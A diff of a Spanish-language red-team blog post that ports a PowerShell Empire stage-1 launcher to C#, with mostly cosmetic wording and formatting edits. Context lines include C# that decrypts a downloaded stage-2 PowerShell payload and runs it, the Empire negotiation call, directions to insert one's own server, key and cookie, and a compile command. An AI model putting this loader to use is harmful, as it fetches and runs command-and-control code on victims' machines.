@@ -115,7 +115,7 @@ $_-bXOr$S[($S[$I]+$S[$H])%256]}};
 
 Ahora tenemos que convertir cada parte de este código en C#. Disfruté mucho aprendiendo algunas clases .Net mientras hacía esta investigación. Comencemos línea por línea.
  
-# De PowerShell a C#
+# De PowerShell a C#.
  
 El **System.Net.ServicePointManager.Expect100Continue** en palabras simples, esta propiedad si es verdadera, las solicitudes del cliente que usan los métodos PUT y POST agregarán un encabezado Expect a la solicitud. Para más información, consulte el [enlace](https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager.expect100continue(v=vs.110).aspx)
 
@@ -289,9 +289,9 @@ byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 ```
 
-# Ejecución de C#
+# Ejecución de C#.
 
-Para ejecutar código en C# podemos usar la clase PowerShell o las clases RunSpace y Pipeline, esto es porque el payload que descargamos de la etapa 2 está en PowerShell. Utilizaremos la clase PowerShell porque, por alguna razón, las clases RunSpace y Pipeline no me funcionaron. En PowerShell, lo ejecutamos usando Invoke-Execution o IEX.
+Para ejecutar código en C# podemos usar la clase **PowerShell** o las clases **RunSpace** y **Pipeline**, esto es porque el payload que descargamos de la etapa 2 está en PowerShell. Utilizaremos la clase PowerShell porque, por alguna razón, las clases RunSpace y Pipeline no me funcionaron. En PowerShell, lo ejecutamos usando Invoke-Execution o IEX.
 
 ```
 // Create a PowerShell Object to execute the command 
@@ -304,7 +304,7 @@ PowerShellInstance.AddScript(stage2);
 PowerShellInstance.Invoke();
 ```
 
-Antes de usar el método Invoke(), necesitamos agregar dos variables a la ecuación, que son $ser y $u. Si observas el valor de los datos (stage 2), notarás que ejecuta una llamada de función de Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u así que, necesitamos pasar las variables $ser y $u para obtener la ejecución, de lo contrario, obtendríamos un error.
+Antes de usar el método Invoke(), necesitamos agregar dos variables a la ecuación, que son **$ser** y **$u**. Si observas el valor de los datos (stage 2), notarás que ejecuta una llamada de función de **Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u** así que, necesitamos pasar las variables $ser y $u para obtener la ejecución, de lo contrario, obtendríamos un error.
 
 ```
 // Create the variables $ser and $u which are part of the downloaded stage2
@@ -444,8 +444,9 @@ namespace PSEmpire_Stage1
     }
 }
 ```
+# Ajustar el Codigo a mi Empire.
 
-Ahora modifique este código para incluir sus variables, necesita cambiar clave (key), servidor (server), destino (target) y cookie. Si no sabe cuál es el suyo, simplemente ejecute el comando de launcher, use base64 para decodificar su script y verifique esos valores.
+Si quieres probar necesitarás modificar este código para incluir tus variables, cambiar **clave (key)**, **servidor (server)**, **destino (target)** y **cookie**. Para obtener esta información de tu Empire ejecuta el comando de launcher (**powershell launcher <Nombre de tu Listener>**), usa **base64 -d** para decodificar el script y verifique esos valores.
 
 Para compilar, puede usar csc.exe y hacer referencia a System.Management.Automation.dll. Ejemplo: guarde su código en PSEmpireStage1.cs y use el símbolo del sistema del desarrollador.
 
@@ -453,7 +454,7 @@ Para compilar, puede usar csc.exe y hacer referencia a System.Management.Automat
 csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
 ```
 
-¡Un video rápido de ejecución!
+Si aún no te queda claro, puedes revisar el video de como hacerlo: 
 
 {% include video id="la1fr4Mpj-4" provider="youtube" %}
  
